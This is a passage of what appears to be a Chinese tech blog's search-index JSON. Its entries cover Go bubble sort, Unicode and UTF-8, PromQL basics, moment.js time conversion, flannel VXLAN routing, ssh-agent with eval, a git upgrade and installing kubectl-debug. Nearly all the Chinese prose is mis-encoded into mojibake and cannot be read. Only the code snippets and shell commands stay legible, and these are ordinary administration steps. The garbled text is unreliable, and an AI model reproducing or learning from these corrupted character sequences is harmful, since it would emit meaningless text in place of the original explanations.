ç¬¬5æ¬¡.ä¸æ¯”ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡å·²ç»ç¡®è®¤60æœ€å¤§äº† ...è¿›è¡Œ5è½®ï¼Œlen(s) - 1 è§„å¾‹ï¼Œæ¯iè½®çš„æ¯”è¾ƒæ¬¡æ•°=len(s) - i */ s := []int{1, 30, 50, 20, 10, 60, 40} // å¤–å±‚å¾ªç¯æ§åˆ¶ï¼Œéœ€è¦è¿›è¡Œå‡ è½®æ¯”è¾ƒ, iä¼šç»å†1,2,3,4,5 for i := 1; i \u003c len(s); i++ { for j := 0; j \u003c len(s)-i; j++ { // å†…å±‚å¾ªç¯æ§åˆ¶æ¯”è¾ƒå‡ æ¬¡, jä¼šç»å† ç¬¬1è½® 0~len(s)-1=0~5. ç¬¬2è½® 0~len(s)-2=0~4. ç¬¬3è½® 0~len(s)-3=0~3...... if s[j] \u003e s[j+1] { swap(s, j, j+1) } } } fmt.Println(s) } func swap(s []int, i, j int) { s[i], s[j] = s[j], s[i] } ","date":"2022-12-12 19:45","objectID":"/post/2939/:0:0","tags":["go"],"title":"goå®ç°åˆ‡ç‰‡çš„å†’æ³¡æ’åº","uri":"/post/2939/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"é¦–å…ˆASCIIç å› ä¸ºæ˜¯ä¸€ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå­—ç¬¦,æˆ‘ä»¬å¯ä»¥æŒ‰ç…§æ¯8ä½åˆ°å¯¹ç…§è¡¨é‡Œæ‰¾å‡ºå¯¹åº”çš„å†…å®¹, å…¶ä¸­æœ€é«˜ä½ä¸º0,åªä½¿ç”¨äº†7ä½,æ‰€ä»¥ä»–çš„ç¼ºç‚¹æ˜¯åªæœ‰128ä¸ªå­—ç¬¦ã€‚è€ŒUnicodeæ˜¯ä¸€ä¸ªé€šç”¨çš„å­—ç¬¦é›†ï¼Œä»–åŒ…å«äº†å„ä¸ªå›½å®¶çš„å­—ç¬¦ï¼Œç›®å‰æ”¶å½•äº†è¶…è¿‡14å‡ ä¸‡ä¸ªå­—ç¬¦ï¼Œåœ¨Unicodeçš„å‰128ä¸ªå­—ç¬¦æ˜¯å’ŒASCIIç ä¸€æ ·çš„ï¼Œæ‰€ä»¥Unicodeå…¼å®¹ASCIIã€‚ Unicodeå°±åƒæ˜¯ä¸€ä¸ªè¶…å¤§çš„å¯†ç æœ¬ï¼Œé‡Œé¢çš„å†…å®¹å°±æ˜¯ç°å®ä¸–ç•Œçš„æ–‡å­—å¯¹åº”è®¡ç®—æœºä¸–ç•Œçš„æ•°å­—ã€‚ æ¯”å¦‚ä¸¥=\u003e4E25=\u003e100111000100101ï¼Œæ¯”å¦‚a=\u003e0061=\u003e1100001 å¯ä»¥å‘ç°å¾ˆå¤šæ•°å­—ä»£è¡¨ç€ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨è®¡ç®—æœºä¸­8ä½ç§°ä¸º1ä¸ªå­—èŠ‚ï¼Œå¾ˆæ˜¾ç„¶è‹±æ–‡å­—æ¯aä½¿ç”¨1ä¸ªå­—èŠ‚å°±èƒ½è¡¨ç¤ºï¼Œè€Œä¸­æ–‡ä¸¥åˆ™éœ€è¦2ä¸ªå­—èŠ‚ã€‚ å¦‚æœè¿™äº›å­—ç¬¦ä¸²ç»„åˆåœ¨ä¸€èµ·ä½ è¦æ€ä¹ˆåŒºåˆ†å‘¢ï¼Ÿæ¯”å¦‚ä¸¥aï¼Œç°åœ¨ç»™ä½ ä¸€ä¸²æ•°å­—1001110001001011100001ï¼Œç”±ä½ æ¥è§£å‡ºä»–å¯¹åº”çš„å†…å®¹ï¼Œæˆ‘æƒ³ä½ æ˜¯æ²¡æœ‰åŠæ³•æ‰¾å‡ºä»–å¯¹åº”çš„å†…å®¹ï¼Œå› ä¸ºä½ å¹¶ä¸çŸ¥é“è¿™ä¸€ä¸²æ•°å­—ä»£è¡¨å‡ ä¸ªå­—ç¬¦ï¼Œå¦‚æœä»–æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆä½ åœ¨unicodeå¯¹ç…§è¡¨ä¸­æ˜¯æ‰¾ä¸åˆ°ä»–å¯¹åº”çš„å­—ç¬¦çš„ï¼Œunicodeä¸­æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ•°å¯¹åº”çš„å­—ç¬¦ï¼Œå¦‚æœä»–æ˜¯ä¸¤ä¸ªå­—ç¬¦é‚£ä¹ˆè¦ä»å“ªé‡Œå¼€å§‹ç®—æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦å‘¢ï¼Ÿ å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§åå•†ä¸€ç§è§„åˆ™ï¼Œè§„å®šè¯¥å¦‚ä½•å­˜å‚¨æ•°æ®ï¼Œè¿™æ ·æˆ‘ä»¬å°±çŸ¥é“è¯¥å¦‚ä½•è¿›è¡Œè§£ç ã€‚æ¯”å¦‚æˆ‘ä»¬å®šä¹‰ï¼šæ¯16ä½(2å­—èŠ‚)ç®—ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å­˜å‚¨æ•°æ®çš„æ—¶å€™å°±éœ€è¦ä¿è¯å•ä¸ªå­—ç¬¦æ»¡è¶³16ä½çš„éœ€æ±‚ï¼Œä¸æ»¡è¶³16ä½åœ¨å‰é¢è¡¥0ã€‚æ¯”å¦‚ä¸¥=\u003e0100 1110 0010 0101ï¼Œæ¯”å¦‚a=\u003e0000 0000 0110 0001ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¬¡å¯¹ä¸¥aè¿›è¡Œè§£ç ï¼Œç»„åˆåä¹Ÿå°±æ˜¯01001110001001010000000001100001ï¼Œæˆ‘ä»¬æŒ‰ç…§æ¯16ä½ä¸€ä¸ªå­—ç¬¦æ¥ç®—ï¼Œå¯ä»¥å°†ä»–æ‹†åˆ†ä¸º0100111000100101 0000000001100001ï¼Œè¿™æ ·å°±å¯ä»¥ç®—å‡ºç»“æœäº†ï¼Œæƒ³çœ‹è®¡ç®—è¿‡ç¨‹çš„å¯ä»¥çœ‹ä¸‹é¢ã€‚é‚£ä¹ˆutf8å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªè§„åˆ™(å®é™…çš„è§„åˆ™å¹¶ä¸æ˜¯ä¸Šé¢ä¸¾ä¾‹çš„ï¼Œä¸Šé¢åªæ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£ã€‚) è®¡ç®—è¿‡ç¨‹ 0100111000100101 =\u003e 16è¿›åˆ¶ (4e25)=\u003e ä¸¥ (unicodeå¯¹ç…§è¡¨ï¼šhttps://www.unicode.org/charts/PDF/U4E00.pdf ) 0000000001100001 =\u003e 16è¿›åˆ¶(0061) =\u003e a (unicodeå¯¹ç…§è¡¨ï¼šhttps://www.unicode.org/charts/PDF/U0000.pdf ) PS: utf8ç¼–ç è§„åˆ™https://www.bo56.com/utf8ç¼–ç è§„åˆ™/ å¦‚æœä½ æƒ³è¯å®Unicodeçš„å‰128ä¸ªå­—ç¬¦æ˜¯å’ŒASCIIç ä¸€æ ·çš„ï¼Œé‚£ä¹ˆä½ å¯ä»¥å…ˆæ‰¾åˆ°ASCIIå¯¹ç…§è¡¨ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªç¬¦å·çš„ASCIIå€¼ï¼Œå°†è¿™ä¸ªå€¼è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œåˆ°è¿™é‡Œè¿›è¡ŒæŸ¥è¯¢https://unicode.org/charts/ï¼Œæ³¨æ„æŸ¥è¯¢çš„æ ¼å¼éœ€è¦æ˜¯\\uxxxxï¼Œä¸è¶³4ä½ç”¨0è¡¥ï¼Œè¿›å…¥ä»–ç»™ä½ çš„pdfä¸­æœç´¢ä½ çš„16è¿›åˆ¶æ•°ï¼Œçœ‹å…¶å¯¹åº”çš„ç¬¦å·å³å¯ã€‚ å‚è€ƒ https://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html ","date":"2022-12-02 01:06","objectID":"/post/2934/:0:0","tags":[],"title":"å…³äºASCIIã€Unicodeã€ç¼–ç çš„ç®€å•ç†è§£","uri":"/post/2934/"},{"categories":["å…¶ä»–"],"content":"å¥½ä¹…æ²¡å‘ç¬”è®°äº†ï¼Œå‘ç‚¹å­˜è´§(â—Ë‡âˆ€Ë‡â—) ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:0","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å…¶ä»–"],"content":"ç¬æ—¶å‘é‡ ä¸€ç»„æ—¶é—´åºåˆ—ï¼Œæ¯ä¸€ä¸ªæ—¶é—´åºåˆ—åŒ…å«ä¸€ä¸ªæ ·æœ¬ï¼Œæ‰€æœ‰æ—¶é—´åºåˆ—å…±äº«ä¸€ä¸ªæ—¶é—´ç‚¹ã€‚ æ¯”å¦‚http_requests_totalæŒ‡æ ‡ 42009-exx1t4nz5w.png çº¢æ¡†å†…çš„ç®—ä¸€ç»„æ—¶é—´åºåˆ—(æ‰€æœ‰æ—¶é—´åºåˆ—)ï¼Œæ¯ä¸€è¡Œç®—ä¸€ä¸ªæ—¶é—´åºåˆ—ï¼Œæ¯ä¸€ä¸ªæ—¶é—´åºåˆ—éƒ½æœ‰è‡ªå·±çš„valueå³æ ·æœ¬ã€‚ æ‰€æœ‰æ—¶é—´åºåˆ—å…±äº«ä¸€ä¸ªæ—¶é—´ç‚¹æ˜¯ä»€ä¹ˆæ„æ€å‘¢? å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä¸€ç»„æ—¶é—´åºåˆ—çš„æ—¶é—´ç‚¹éƒ½æ˜¯2022-07-18 21:12:15çš„ã€‚ ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:1","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å…¶ä»–"],"content":"èŒƒå›´å‘é‡ ä¸€ç»„æ—¶é—´åºåˆ—ï¼Œæ¯ä¸ªæ—¶é—´åºåˆ—åŒ…å«Nä¸ªæ ·æœ¬æ•°æ®(éšæ—¶é—´å˜åŒ–çš„) è¿˜æ˜¯æ‹¿http_requests_totalæŒ‡æ ‡ä¸¾ä¾‹ 46134-6267onrxtjw.png å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨æœ€ååŠ äº†[1m],å³http_requests_total[1m]ä»€ä¹ˆæ„æ€å‘¢? è·å–æ¯ä¸ªæ—¶é—´åºåˆ—è¿‡å»1åˆ†é’Ÿå†…çš„æ‰€æœ‰æ ·æœ¬å’Œå¯¹å®ƒåº”çš„æ—¶é—´ï¼Œå› ä¸ºæ²¡æœ‰æŒ‡å®šæ—¶é—´ï¼Œæ‰€ä»¥é»˜è®¤å°±æ˜¯å½“å‰æ—¶é—´ï¼Œå«ä¹‰å°±æ˜¯å½“å‰æ—¶é—´-1mè¿™ä¸ªæ—¶é—´èŒƒå›´çš„æ•°æ®ã€‚å¯ä»¥çœ‹åˆ°è¿™æ ·ç»“æœå’Œç¬æ—¶å‘é‡æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œè¿™ç§æ•°æ®å°±æ˜¯èŒƒå›´å‘é‡äº†ã€‚ä¸ºä»€ä¹ˆä¸€ä¸ªæ—¶é—´åºåˆ—åªæœ‰4ä¸ªæ ·æœ¬æ•°æ®å‘¢ï¼Ÿå› ä¸º15ç§’æ”¶é›†ä¸€æ¬¡ï¼Œ1åˆ†é’Ÿåˆšå¥½4ä¸ªã€‚ ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:2","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å…¶ä»–"],"content":"æ ‡é‡ å°±æ˜¯ç®€å•çš„æ•°å­—ã€æµ®ç‚¹å‹æ•°æ® ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:3","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å…¶ä»–"],"content":"Offsetä¿®é¥°ç¬¦ ç”¨äºä¿®æ”¹ç¬æ—¶å‘é‡ã€èŒƒå›´å‘é‡çš„æ—¶é—´åç§»é‡ã€‚ ä¸¾ä¸ªä¾‹å­ http_requests_total offset 1m 33556-8u1smsk7a1e.png æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬æŸ¥è¯¢æ˜¯å½“å‰æ—¶é—´, åŠ äº†offset 1måå°±ä»£è¡¨å½“å‰æ—¶é—´å‡1mã€‚è¿™é‡Œå’Œ[1m]ä¸ä¸€æ ·çš„æ˜¯,[1m]çš„æŸ¥è¯¢ç»“æœæ˜¯èŒƒå›´å‘é‡ï¼Œè€Œoffset 1mçš„ç»“æœæ˜¯ä¸ä¼šå˜çš„ï¼Œä»–è¿˜æ˜¯ç¬æ—¶å‘é‡ï¼Œæœ€ç»ˆä»–çš„å«ä¹‰å°±æ˜¯è·å–1åˆ†é’Ÿå‰çš„æ—¶é—´ç‚¹çš„æ ·æœ¬æ•°æ® åœ¨ä¸¾ä¸€ä¸ªä¾‹å­ http_requests_total[1m] offset 2m 78122-gb5xr85alv4.png é¦–å…ˆçœ‹ç»“æœä»–è‚¯å®šæ˜¯ä¸€ä¸ªèŒƒå›´å‘é‡ï¼Œå…ˆä¸çœ‹offset 2mï¼Œå…ˆçœ‹http_requests_total[1m]ä»–çš„å«ä¹‰æ˜¯è·å–å½“å‰æ—¶é—´-1måˆ°å½“å‰æ—¶é—´çš„æ•°æ®ã€‚offsetåšäº†ä»€ä¹ˆå‘¢? å…¶å®ä»–å°±æ˜¯æŠŠå½“å‰æ—¶é—´ä¿®æ”¹äº†ï¼Œä¹Ÿå°±æ˜¯å½“å‰æ—¶é—´-2mï¼Œæœ€ç»ˆå«ä¹‰å°±å˜æˆäº†: è·å–(å½“å‰æ—¶é—´-2m)-1måˆ°å½“å‰æ—¶é—´-2mçš„æ•°æ® offsetè¿˜å¯ä»¥æŒ‡å®šè´Ÿæ•°ï¼Œä¹Ÿå°±æ˜¯å°†æ—¶é—´ç‚¹åç§»åˆ°æœªæ¥ï¼Œè¿™ä¸ªçš„ä½¿ç”¨åœºæ™¯æˆ‘åªèƒ½æƒ³åˆ°æ˜¯åœ¨æŒ‡å®šäº†æŸ¥è¯¢æ—¶é—´çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚(http_requests_total{job=\"RabbitMQ\"} offset -1d) - (http_requests_total{job=\"RabbitMQ\"} offset 1d) 06983-4wset9fq927.png å°†è¿™ä¸ªå¼å­æƒ³è±¡æˆä¸€ä¸ªçº¿æ®µï¼Œè¿™å°†ä»¥2022-07-15 00:00:00ä¸ºä¸­ç‚¹ï¼Œç”¨å³è¾¹çš„å€¼å‡å»å·¦è¾¹çš„å€¼å°±æ˜¯ä¸­é—´åŒºåŸŸçš„å€¼äº†ï¼Œæœ€ç»ˆè®¡ç®—å‡º14å·åˆ°16å·çš„è¯·æ±‚æ•°ã€‚ 44501-fblz2hr0ds9.png æ³¨æ„ä½¿ç”¨è´Ÿåç§»éœ€è¦å¼€å¯å‚æ•°â€“enable-feature=promql-negative-offset ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:4","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å…¶ä»–"],"content":"@ ä¿®é¥°ç¬¦ ç”¨æ¥è®¾ç½®æŸ¥è¯¢å€¼çš„æ—¶é—´ï¼Œæ¯”å¦‚http_requests_total @ 1609746000æŸ¥è¯¢2021å¹´1æœˆ4æ—¥ 15ç‚¹40çš„å€¼ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ç”¨apiæŸ¥è¯¢å°±è¶³å¤Ÿäº†ï¼Œquery APIå¯ä»¥æŒ‡å®štimeå‚æ•°ï¼Œquery_range APIå¯ä»¥æŒ‡å®šstartã€endå‚æ•°ã€‚ å¦‚æœæƒ³è¦ä½¿ç”¨@ä¿®é¥°ç¬¦éœ€è¦å¯ç”¨--enable-feature=promql-at-modifier ","date":"2022-11-29 23:05","objectID":"/post/2920/:0:5","tags":["prometheus","promql"],"title":"promqlåŸºæœ¬æ¦‚å¿µ(ä¸€)","uri":"/post/2920/"},{"categories":["å‰ç«¯"],"content":"ä½œè€…ï¼šveryCold é“¾æ¥ï¼šhttps://juejin.cn/post/7099718143303483429 æ¥æºï¼šç¨€åœŸæ˜é‡‘ ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:0","tags":["react","nodejs","vue"],"title":"ä½¿ç”¨momentå°†UTCæ—¶é—´è½¬æœ¬åœ°æ—¶é—´","uri":"/post/2911/"},{"categories":["å‰ç«¯"],"content":"å®‰è£… npm install moment --save // npm yarn add moment // Yarn ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:1","tags":["react","nodejs","vue"],"title":"ä½¿ç”¨momentå°†UTCæ—¶é—´è½¬æœ¬åœ°æ—¶é—´","uri":"/post/2911/"},{"categories":["å‰ç«¯"],"content":"ä½¿ç”¨ å°†utcæ—¶é—´è½¬ä¸ºæœ¬åœ°æ—¶é—´ // utils.js import moment from 'moment' â€‹ // è¿™é‡Œdateæ˜¯åç«¯è¿”å›çš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œå¦‚ï¼š2022-05-13 16:31:53 export function utcToLocal(date) { const fmt = 'YYYY-MM-DD HH:mm:ss' return moment.utc(date).local().format(fmt) } å°†æœ¬åœ°æ—¶é—´è½¬ä¸ºutcæ—¶é—´ export function localToUtc(date) { const fmt = 'YYYY-MM-DD HH:mm:ss' return moment(date, fmt).utc().format(fmt) } ","date":"2022-11-22 22:27","objectID":"/post/2911/:0:2","tags":["react","nodejs","vue"],"title":"ä½¿ç”¨momentå°†UTCæ—¶é—´è½¬æœ¬åœ°æ—¶é—´","uri":"/post/2911/"},{"categories":["kubernetes","äº‘åŸç”Ÿ"],"content":"ç¯å¢ƒä¿¡æ¯ 99837-ha7zzk0habt.png ç›®æ ‡ï¼šè¦è®¿é—®ç›®æ ‡IPä¸º10.244.4.51çš„POD é¦–å…ˆç»è¿‡è·¯ç”±è¡¨åŒ¹é…è§„åˆ™10.244.4.0/23 via 10.244.4.0 dev flannel.1 onlink ç¡®å®šä¸‹ä¸€è·³ä¸º10.244.4.0(ç›®æ ‡PODæ‰€å±Nodeä¸Šflannel.1çš„IP) é€šè¿‡arpè¡¨å¯ä»¥æ‰¾åˆ°ç›®æ ‡podæ‰€åœ¨èŠ‚ç‚¹çš„flannel.1ç½‘å¡çš„MACåœ°å€(å¯¹ç«¯VTEPè®¾å¤‡çš„MAC)arp -an | grep 10.244.4.0 =\u003e be:85:93:2a:37:68 å†…æ ¸å°è£…æ•°æ®å¸§ï¼ŒæºMACæ˜¯å½“å‰flannel.1çš„ï¼Œç›®æ ‡MACæ˜¯å¯¹ç«¯flannel.1çš„ ç´§æ¥ç€å†…æ ¸ä¼šå¯¹è¿™ä¸ªæ•°æ®å¸§æ·»åŠ vxlanæŠ¥å¤´ï¼ŒVNIä¸º1 flannel.1å°†æ•°æ®å¸§å°è£…æˆUDPæŠ¥æ–‡,é€šè¿‡FDBè¡¨æ ¹æ®MACæŸ¥æ‰¾ç›®æ ‡IPã€‚bridge fdb show | grep be:85:93:2a:37:68 =\u003e 192.168.124.104 UDPæŠ¥æ–‡çš„æºIPæ˜¯ip -d link show flannel.1 | grep -o 'vxlan.*eth.' =\u003e 192.168.124.103ï¼Œç›®æ ‡IPä¸Šé¢å·²ç»è·å–äº†ï¼Œç›®æ ‡ç«¯å£æ˜¯8472 åœ¨å¾€åå°±æ˜¯ç³»ç»Ÿæ­£å¸¸çš„å°è£…äº†ï¼ŒUDPä¼šè¢«å°è£…åœ¨IPæŠ¥æ–‡é‡Œï¼ŒIPæŠ¥æ–‡ä¼šè¢«å°è£…åœ¨æ•°æ®å¸§é‡Œï¼Œæœ€ç»ˆé€šè¿‡bitæµä¼ é€åˆ°Node2 Node2çš„æ”¶åˆ°æ•°æ®è¿›è¡Œè§£å°è£…ï¼Œåˆ°è¾¾8472ç«¯å£ï¼Œäº¤ç”±å†…æ ¸ä¸­çš„VXLANæ¨¡å—å¤„ç†(æ­¤æ—¶å¤„ç†çš„æ˜¯vxlanæŠ¥æ–‡) VXLANæ¨¡å—ä¼šæ¯”è¾ƒè¿™ä¸ªvxlanæŠ¥å¤´ä¸­çš„VNIå’Œæœ¬æœºçš„VTEPè®¾å¤‡(flannel.1)çš„VNIæ˜¯å¦ä¸€è‡´ï¼Œç„¶åæ¯”è¾ƒå†…éƒ¨æ•°æ®å¸§ä¸­çš„ç›®çš„MACåœ°å€ä¸æœ¬æœºçš„flannel.1æ˜¯å¦ä¸€è‡´ï¼Œéƒ½æ²¡é—®é¢˜åï¼Œå°†vxlanæŠ¥å¤´å’Œå†…éƒ¨æ•°æ®å¸§æ‹†æ‰ï¼Œå°†å†…éƒ¨æ•°æ®åŒ…é€šè¿‡flannel.1å‘å‡º é€šè¿‡è·¯ç”±è¡¨å¾—çŸ¥å‘å¾€10.244.4.0/23ç½‘æ®µçš„æ•°æ®åŒ…è¦èµ°cni0ï¼Œcni0å°†æ•°æ®åŒ…å‘å¾€æœ€ç»ˆçš„podå¯¹åº”çš„veth pairè®¾å¤‡ ","date":"2022-11-17 23:40","objectID":"/post/2908/:0:0","tags":["k8s","flannel","vxlan"],"title":"flannel vxlanæ¨¡å¼é€šä¿¡ç®€è¯»","uri":"/post/2908/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ‰§è¡Œæµ‹è¯• 1.é¦–å…ˆæˆ‘ä»¬ç›´æ¥è¿è¡Œssh-agent,å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ•ˆæœ 70201-ri3g9z9reom.png 2.å½“æˆ‘ä»¬æ‰§è¡Œssh-addæ—¶ï¼Œæç¤ºå¦‚ä¸‹ 15128-30bmqpdy82.png ssh-addä¼šé€šè¿‡SSH_AUTH_SOCKç¯å¢ƒå˜é‡ï¼Œè·å–ä¸ssh-agenté€šä¿¡çš„unixå¥—æ¥å­—,æ‰€ä»¥æˆ‘ä»¬ä¸‹é¢éœ€è¦è®¾ç½®æœ€å¼€å§‹æç¤ºçš„ç¯å¢ƒå˜é‡ã€‚ https://www.ssh.com/academy/ssh/agent#starting-ssh-agent 3.é…ç½®ç¯å¢ƒå˜é‡æµ‹è¯• SSH_AUTH_SOCK=/tmp/ssh-8DzA6Dlx4wHO/agent.10547; export SSH_AUTH_SOCK; ssh-add 27709-ybdyc76azv.png å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥ä½¿ç”¨äº†ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤çš„ç»“æœä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªSSH_AGENT_PIDç¯å¢ƒå˜é‡ï¼Œè¿™ä¸ªæ˜¯ssh-agentçš„è¿›ç¨‹ID,ä½¿ç”¨ssh-agent -kå¯ä»¥ç”¨æ¥é€€å‡ºä»£ç†ç¨‹åºã€‚ é€šè¿‡ä¸Šé¢çš„æµ‹è¯•å‘ç°ï¼Œåªè¦æˆ‘ä»¬çš„ç¯å¢ƒå˜é‡é…ç½®å¥½æ­£ç¡®çš„unixå¥—æ¥å­—ï¼Œå°±å¯ä»¥ä½¿ç”¨ssh-agentäº†ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¿™æ ·é…ç½®å¤ªéº»çƒ¦äº†ã€‚ ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:1","tags":["shell"],"title":"å…³äºä¸ºä»€ä¹ˆssh-agentéœ€è¦ä½¿ç”¨evalæ¥è¿è¡Œ","uri":"/post/2893/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸ºä»€ä¹ˆssh-agentä¸å¸®æˆ‘ä»¬è®¾ç½®ç¯å¢ƒå˜é‡å‘¢? è¿™å…¶å®å’Œlinuxæ“ä½œç³»ç»Ÿæœ‰å…³ï¼Œå› ä¸ºssh-agentæ˜¯ä½œä¸ºå½“å‰shellçš„ä¸€ä¸ªå­è¿›ç¨‹è¿è¡Œçš„ã€‚åœ¨linuxä¸­ï¼Œè¿›ç¨‹åªèƒ½ä¿®æ”¹è‡ªå·±çš„ç¯å¢ƒå˜é‡ï¼Œå¹¶å°†å®ƒä»¬ä¼ é€’ç»™å­è¿›ç¨‹ã€‚ä½†å®ƒä¸èƒ½ä¿®æ”¹å…¶çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºç³»ç»Ÿä¸å…è®¸ã€‚ https://unix.stackexchange.com/questions/351725/why-eval-the-output-of-ssh-agent ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:2","tags":["shell"],"title":"å…³äºä¸ºä»€ä¹ˆssh-agentéœ€è¦ä½¿ç”¨evalæ¥è¿è¡Œ","uri":"/post/2893/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä½¿ç”¨evalè§£å†³ evalå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‘½ä»¤æ¥æ‰§è¡Œï¼Œåœ¨æˆ‘ä»¬ç›´æ¥æ‰§è¡Œssh-agentæ—¶ï¼Œå±å¹•ä¼šè¾“å‡ºä¸‰è¡Œå†…å®¹ï¼Œè¿™ä¸‰è¡Œå†…å®¹å°±æ˜¯ä¸‰æ¡å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†ssh-agentçš„æ‰§è¡Œç»“æœåœ¨å½“å‰Shellä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆä½ å¯ä»¥çœ‹ä¸‹ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼Œæ˜¯ä¸æ˜¯å¾ˆåˆç† eval $(ssh-agent) 04505-0zvqsslretxa.png é¦–å…ˆæ‰§è¡Œssh-agentï¼Œè¾“å‡ºçš„ç»“æœæ˜¯ä¸‰è¡Œå‘½ä»¤ï¼Œé€šè¿‡evalæ¥æ‰§è¡Œè¿™ä¸‰è¡Œå‘½ä»¤ï¼Œå°±è¾¾åˆ°äº†è‡ªåŠ¨æ·»åŠ ç¯å¢ƒå˜é‡çš„ç›®çš„.å› ä¸ºç¬¬ä¸‰è¡Œæ˜¯ä¸€ä¸ªechoå‘½ä»¤ï¼Œæ‰€ä»¥å°†pidè¾“å‡ºäº†å‡ºæ¥ã€‚ ","date":"2022-09-13 15:02","objectID":"/post/2893/:0:3","tags":["shell"],"title":"å…³äºä¸ºä»€ä¹ˆssh-agentéœ€è¦ä½¿ç”¨evalæ¥è¿è¡Œ","uri":"/post/2893/"},{"categories":["å…¶ä»–"],"content":" fatal: git fetch-pack: expected shallow list fatal: The remote end hung up unexpectedly å‡çº§git yum install -y \\ https://repo.ius.io/ius-release-el7.rpm \\ https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm yum install -y git236 ","date":"2022-08-25 15:59","objectID":"/post/2891/:0:0","tags":[],"title":"gitlab ci æ‹‰å–ä»£ç å‡ºç°hung up unexpectedly","uri":"/post/2891/"},{"categories":["kubernetes"],"content":"github https://github.com/aylei/kubectl-debug https://github.com/JamesTGrant/kubectl-debug åŸä½œæ•™ç¨‹ https://aleiwu.com/post/kubectl-debug-intro/ æ­£å¦‚readmeä¸­æ‰€è¯´ ä» kubernetes 1.23å¼€å§‹ï¼Œä¸´æ—¶å®¹å™¨åŠŸèƒ½å¤„äºæµ‹è¯•é˜¶æ®µï¼ˆé»˜è®¤å¯ç”¨ï¼‰ ä¸´æ—¶å®¹å™¨åŠŸèƒ½ä» kubernetes 1.16åˆ°1.22 å¤„äºalphaé˜¶æ®µã€‚åœ¨ Kubernetes ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œéœ€è¦æ˜¾å¼å¯ç”¨ alpha åŠŸèƒ½ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨alphaåŠŸèƒ½ï¼‰ã€‚ åœ¨è€ç‰ˆæœ¬çš„é›†ç¾¤ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹é¢çš„è¿™ç§æ–¹å¼æ¥å®ç°kubectl debug ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:0","tags":["k8s"],"title":"kubectl debug - ç¤¾åŒºæ–¹æ¡ˆ","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"ä¸€ã€å®‰è£… wget https://github.com/aylei/kubectl-debug/releases/download/v0.1.1/kubectl-debug_0.1.1_linux_amd64.tar.gz tar xf kubectl-debug_0.1.1_linux_amd64.tar.gz chmod +x kubectl-debug mv kubectl-debug /usr/local/bin ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:1","tags":["k8s"],"title":"kubectl debug - ç¤¾åŒºæ–¹æ¡ˆ","uri":"/post/2878/"},{"categories":["kubernetes"],"content":"äºŒã€ç¤ºä¾‹ åˆ›å»ºæµ‹è¯•Pod kubectl run ephemeral-demo --image=registry.aliyuncs.com/google_containers/pause:3.1 --restart=Never 1.ç®€å•è°ƒè¯• kubectl debug ephemeral-demo --agentless --port-forward --agent-image=aylei/debug-agent:v0.1.1 å¦‚æœçœ‹åˆ°Error: No such image: nicolaka/netshoot:latestè¿™æ 